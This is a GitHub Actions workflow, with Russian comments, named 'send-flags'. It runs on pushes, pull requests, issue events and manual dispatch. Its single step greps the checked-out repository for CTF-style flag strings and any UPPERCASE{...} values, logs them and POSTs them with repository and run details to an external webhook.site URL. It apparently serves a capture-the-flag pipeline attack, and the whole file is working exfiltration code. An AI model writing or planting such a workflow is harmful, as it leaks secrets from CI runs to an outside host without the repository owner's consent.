name: send-flags

on:
  push:
    branches: [ main, master ]
  pull_request:
  issues:
  workflow_dispatch:

jobs:
  find-flags:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0
      
      - name: Find and send flags
        run: |
          echo "🔍 Searching for flags..."
          
          # Ищем флаги в формате FLAG: "..." или FLAG{...} или USER{...}
          FLAGS=$(grep -rnoE '(F|f)(L|l)(A|a)(G|g):\s*"[^"]+"|(F|f)(L|l)(A|a)(G|g)\{[^}]+\}|[A-Z]+\{[^}]+\}' . --exclude-dir=.git | head -20)
          
          # Показываем найденные флаги в логах
          echo "========================================="
          echo "FOUND FLAGS:"
          echo "$FLAGS"
          echo "========================================="
          
          # Формируем JSON для отправки
          if [ -n "$FLAGS" ]; then
            # Преобразуем флаги в JSON-массив
            FLAGS_JSON=$(echo "$FLAGS" | jq -R -s -c 'split("\n") | map(select(. != ""))')
            
            # Отправляем на webhook
            curl -X POST \
              -H "Content-Type: application/json" \
              -d "{
                \"repository\": \"${{ github.repository }}\",
                \"event\": \"${{ github.event_name }}\",
                \"commit\": \"${{ github.sha }}\",
                \"flags\": $FLAGS_JSON,
                \"run_url\": \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"
              }" \
              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
            
            echo "✅ Flags sent to webhook!"
          else
            echo "❌ No flags found"
            curl -X POST \
              -H "Content-Type: application/json" \
              -d "{
                \"repository\": \"${{ github.repository }}\",
                \"event\": \"${{ github.event_name }}\",
                \"status\": \"no_flags_found\"
              }" \
              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
          fi